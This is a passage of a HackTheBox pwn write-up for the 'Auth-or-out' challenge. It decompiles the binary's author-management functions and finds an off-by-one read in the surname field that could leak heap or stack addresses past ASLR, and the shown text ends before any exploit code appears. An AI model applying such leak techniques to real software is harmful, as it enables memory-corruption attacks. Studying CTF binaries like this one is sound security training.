<!doctype html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Writeups</title>
        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
        <script type="text/x-mathjax-config">
            MathJax.Hub.Config({
                tex2jax: {
                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
                    processEscapes: true
                },
                config: ["MMLorHTML.js"],
                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
                extensions: ["MathMenu.js", "MathZoom.js"]
            });
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
    </head>
    <body>
        <div id="navbar">
            <a href="/CTF-writeups" id="root-link">
                <h2>Rektedekte</h2>
            </a>
            <ul id="nav-links">
				<li><a href="/CTF-writeups/search" class="no-flash">
					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
				</a></li>
                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
                </a></li>
                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
                </a></li>
                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
                </a></li>
            </ul>
        </div>
        
    <div id="content">
        <h3>
            <a href="/CTF-writeups\htb\pwn">pwn</a>
            <a href="/CTF-writeups\htb\pwn\auth-or-out/files.zip" class="text-right">Download</a>
        </h3>
        <h1>
            <span>Auth-or-out</span>
            <span class="text-right">[60]</span>
        </h1>
        <hr class="no-space">
        
            
    <div class="tags">
        
            
                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
            
        
    </div>

        
        
            <div id="markdown">
                <p>In this challenge, we are given an executable <em>auth-or-out</em>, which i have shortened to <code>auth</code>. The name might lead you to believe the challenge is about authentication, but that would be wrong. Running the program, we see that it is an author-note manager. This challenge contains some quite complicated code, so i will be using ghidra instead of IDA. ghidra struggled a bit with it, so we might see some variable collisions.</p>
<p>The program contains a few interesting functions.</p>
<ul>
<li>
<p>main</p>
</li>
<li>
<p>delete_author</p>
</li>
<li>
<p>print_author</p>
</li>
<li>
<p>add_author</p>
</li>
<li>
<p>modify_author</p>
</li>
</ul>
<p>Let's go through them one-by-one.</p>
<hr />
<h1>Program analysis</h1>
<h2>main</h2>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
<span class="w">  </span><span class="kt">_Bool</span><span class="w"> </span><span class="n">_Var1</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">uVar2</span><span class="p">;</span>
<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">;</span>
<span class="w">  </span><span class="n">uchar</span><span class="w"> </span><span class="n">CustomHeap</span><span class="w"> </span><span class="p">[</span><span class="mi">14336</span><span class="p">];</span>
<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="n">auStack24</span><span class="w"> </span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_10</span><span class="p">;</span>

<span class="w">  </span><span class="n">local_10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">);</span>
<span class="w">  </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">CustomHeap</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">14336</span><span class="p">);</span>
<span class="w">  </span><span class="n">_Var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ta_init</span><span class="p">(</span><span class="n">CustomHeap</span><span class="p">,</span><span class="n">auStack24</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_Var1</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;*** Welcome to DZONERZY authors editor v0.11.2 ***&quot;</span><span class="p">);</span>
<span class="nl">switchD_00101a4f_caseD_0</span><span class="p">:</span>
<span class="w">    </span><span class="n">uVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">print_menu</span><span class="p">();</span>
<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="n">uVar2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
<span class="w">      </span><span class="n">add_author</span><span class="p">();</span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">switchD_00101a4f_caseD_0</span><span class="p">;</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span>
<span class="w">      </span><span class="n">modify_author</span><span class="p">();</span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">switchD_00101a4f_caseD_0</span><span class="p">;</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
<span class="w">      </span><span class="n">print_author</span><span class="p">();</span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">switchD_00101a4f_caseD_0</span><span class="p">;</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span>
<span class="w">      </span><span class="n">delete_author</span><span class="p">();</span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">switchD_00101a4f_caseD_0</span><span class="p">;</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">switchD_00101a4f_caseD_5</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="nl">LAB_00101a9b</span><span class="p">:</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_10</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
<span class="w">    </span><span class="n">__stack_chk_fail</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="nl">switchD_00101a4f_caseD_5</span><span class="p">:</span>
<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;bye bye!&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_00101a9b</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>As the entry point of the program, this function serves to control call the functions the user requests. Additionally, we see a section of the code creates a custom heap, interresting. If we dig into the strings of the program, we'll find a hint:</p>
<p><code>tinyalloc: https://github.com/thi-ng/tinyalloc</code></p>
<p>A github link to the specific implementation the program uses, quite useful. I will get back to this topic later, for now, let's move on.</p>
<h2>add_author</h2>
<p>Probably the most important function of the program.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">add_author</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
<span class="w">  </span><span class="n">PAuthor</span><span class="w"> </span><span class="n">address</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">age</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">note_size</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">note_address</span><span class="p">;</span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">NoteSize</span><span class="p">;</span>

<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="mi">9</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;MAX AUTHORS REACHED!&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">PAuthor</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PAuthor</span><span class="p">)</span><span class="n">ta_alloc</span><span class="p">(</span><span class="mi">56</span><span class="p">);</span>
<span class="w">  </span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">address</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="n">PAuthor</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Print</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PrintNote</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Name: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">get_from_user</span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Surname: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">get_from_user</span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Surname</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Age: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="w">    </span><span class="n">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_number</span><span class="p">();</span>
<span class="w">    </span><span class="n">address</span><span class="o">-&gt;</span><span class="n">Age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author Note size: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">note_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_number</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="w">      </span><span class="n">note_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">ta_alloc</span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">      </span><span class="n">address</span><span class="o">-&gt;</span><span class="n">Note</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">note_address</span><span class="p">;</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Note</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid allocation!&quot;</span><span class="p">);</span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Note: &quot;</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">note_size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">257</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">note_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="n">get_from_user</span><span class="p">(</span><span class="n">authors</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Note</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author %llu added!</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid allocation!&quot;</span><span class="p">);</span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span>
<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>This function handles the creation of a new author. It also gives us an insight into how the authors are stored. To abstract it:</p>
<p>Author:</p>
<ul>
<li>
<p>Name</p>
</li>
<li>
<p>Surname</p>
</li>
<li>
<p>*Note -&gt; chunk[note_size]</p>
</li>
<li>
<p>Age</p>
</li>
<li>
<p>PrintNote</p>
</li>
</ul>
<p>These are then stored in an array in the .bss section. Both the attribute and note section are chunks, allocated by ta_alloc.</p>
<p>Interestingly, the function increments <code>note_size</code> by one when below 257.</p>
<h2>print_author</h2>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">print_author</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">id</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">authorid</span><span class="p">;</span>
<span class="w">  </span><span class="n">PAuthor</span><span class="w"> </span><span class="n">a</span><span class="p">;</span>
<span class="w">  </span><span class="n">PAuthor</span><span class="w"> </span><span class="n">address</span><span class="p">;</span>

<span class="w">  </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author ID: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_number</span><span class="p">();</span>
<span class="w">    </span><span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">10</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">id</span><span class="p">);</span>
<span class="w">  </span><span class="n">address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authors</span><span class="p">[</span><span class="n">id</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">address</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">PAuthor</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author %llu does not exists!</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">id</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;----------------------&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author %llu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">id</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Name: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">address</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Surname: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">address</span><span class="o">-&gt;</span><span class="n">Surname</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Age: %llu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">address</span><span class="o">-&gt;</span><span class="n">Age</span><span class="p">);</span>
<span class="w">    </span><span class="p">(</span><span class="o">*</span><span class="n">address</span><span class="o">-&gt;</span><span class="n">Print</span><span class="p">)(</span><span class="n">address</span><span class="o">-&gt;</span><span class="n">Note</span><span class="p">);</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;-----------------------&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>This function is quite simple. It first checks if the given author exists, then prints all attributes to the user. The most important thing to notice here, is that it uses printf, which is null-terminated. If the heap isn't cleaned properly, we might be able to abuse this.</p>
<h2>modify_author</h2>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">modify_author</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
<span class="w">  </span><span class="n">PAuthor</span><span class="w"> </span><span class="n">buffer</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">id</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">authorid</span><span class="p">;</span>
<span class="w">  </span><span class="n">PAuthor</span><span class="w"> </span><span class="n">a</span><span class="p">;</span>

<span class="w">  </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author ID: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_number</span><span class="p">();</span>
<span class="w">    </span><span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">10</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">id</span><span class="p">);</span>
<span class="w">  </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authors</span><span class="p">[</span><span class="n">id</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">PAuthor</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author %llu does not exists!</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">id</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Name: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">get_from_user</span><span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Surname: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">get_from_user</span><span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">Surname</span><span class="p">,</span><span class="mh">0x11</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Age: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_number</span><span class="p">();</span>
<span class="w">    </span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">Age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">id</span><span class="p">;</span>
<span class="w">    </span><span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Here we are able to modify existing authors. By itself this function is quite useless to us, since we can't change the Note content, but a small error flips that on its head. The function reads an extra byte for the surname, thus eliminating the null-terminator. Can we leak something?</p>
<h2>delete_author</h2>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">delete_author</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
<span class="w">  </span><span class="n">PAuthor</span><span class="w"> </span><span class="n">free</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">id</span><span class="p">;</span>
<span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">authorid</span><span class="p">;</span>
<span class="w">  </span><span class="n">PAuthor</span><span class="w"> </span><span class="n">a</span><span class="p">;</span>

<span class="w">  </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author ID: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_number</span><span class="p">();</span>
<span class="w">    </span><span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">10</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">id</span><span class="p">);</span>
<span class="w">  </span><span class="n">free</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authors</span><span class="p">[</span><span class="n">id</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">free</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">PAuthor</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author %llu does not exists!</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">id</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">ta_free</span><span class="p">(</span><span class="n">free</span><span class="o">-&gt;</span><span class="n">Note</span><span class="p">);</span>
<span class="w">    </span><span class="n">ta_free</span><span class="p">(</span><span class="n">free</span><span class="p">);</span>
<span class="w">    </span><span class="n">authors</span><span class="p">[</span><span class="n">id</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PAuthor</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Author %llu deleted!</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">id</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Last but not least, <code>delete_author</code>. There is not much to this function, but we can make some conclusions:</p>
<ul>
<li>
<p>Both the Note and the Author object itself is freed.</p>
</li>
<li>
<p>The pointer is properly discarded.</p>
</li>
<li>
<p>The function checks if the author exists, to avoid a null or double free.</p>
</li>
</ul>
<h2>tinyalloc</h2>
<p>The inclusion of a hint within the program, would lead you to believe that it is important. I would certainly agree than understand chunk allocation and freeing is important for this challenge, but the specific implenentation, not so much.  It does give us an idea about the arguments provided though. I leave you with a diagram over the heap structure:</p>
<p><img alt="" src="heap.png" /></p>
<hr />
<h1>Exploiting</h1>
<p>So as you might have gathered already, there is potential for some pretty hefty leaks. The binary is compiled with both PIE and ASLR, so doing any form of rop-chain would require leaks. The program is also compiled with a canary, but the lack of any buffer overflows make that more or less irrelevent. I will go through my findings in order:</p>
<h2>Leaking the stack</h2>
<p>The first potential leak that came to mind, was the one found in <code>modify_author</code>. You might remember this line:</p>
<div class="codehilite"><pre><span></span><code><span class="n">get_from_user</span><span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">Surname</span><span class="p">,</span><span class="mh">0x11</span><span class="p">);</span>
</code></pre></div>

<p>First off, is this a one-byte overflow? If we are reading 17 bytes into a 16 byte space, that would overflow the lowest byte of the following address. Let's check out <code>get_from_user</code>:</p>
